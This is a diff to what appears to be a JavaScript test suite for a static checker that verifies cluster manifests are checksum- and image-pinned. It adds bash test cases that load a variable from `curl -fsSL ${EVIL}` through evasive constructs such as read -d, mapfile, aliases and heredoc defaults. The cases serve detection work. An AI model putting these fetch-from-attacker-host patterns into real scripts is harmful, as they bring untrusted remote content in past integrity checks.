@@ -810,6 +810,12 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     'read from a pipe (while)': `curl -fsSL ${EVIL} | while read -r STATIC_LSN; do :; done`,
     'while read … done < <(…)': `while read -r STATIC_LSN; do break; done < <(curl -fsSL ${EVIL})`,
     'read -a': `read -r -a STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'read -d ";" (a separator inside quotes)': `read -r -d ";" STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'read -p "a|b"': `read -r -p "a|b" STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    "mapfile -d ';'": `mapfile -d ';' STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    '${V:=…} inside an unquoted heredoc': `cat >/dev/null <<EOF\n\${STATIC_LSN:=$(curl -fsSL ${EVIL})}\nEOF`,
+    'a write in a sourced file that cannot be read': '. /tmp/not-in-the-tree.sh',
+    'an alias for read': `shopt -s expand_aliases; alias rd=read; rd -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'printf -v': `printf -v STATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
     'printf -vNAME (attached)': `printf -vSTATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
     mapfile: `mapfile -t STATIC_LSN < <(curl -fsSL ${EVIL})`,
@@ -916,6 +922,7 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
         [`${label} coproc`]: `${STRICT}coproc C { ${producer}; }\nread -r V <&"\${C[0]}"\n${apply}\n`,
         [`${label} $REPLY`]: `${STRICT}read -r < <(${producer})\nV="$REPLY"\n${apply}\n`,
         [`${label} printf -v "$n"`]: `${STRICT}n=V\nprintf -v "$n" "%s" "$(${producer})"\n${apply}\n`,
+        [`${label} heredoc \${V:=}`]: `${STRICT}cat >/dev/null <<EOF\n\${V:=$(${producer})}\nEOF\n${apply}\n`,
         [`${label} $(<file)`]: `${STRICT}${producer} > /tmp/f\nV="$(</tmp/f)"\n${apply}\n`,
       });
     }
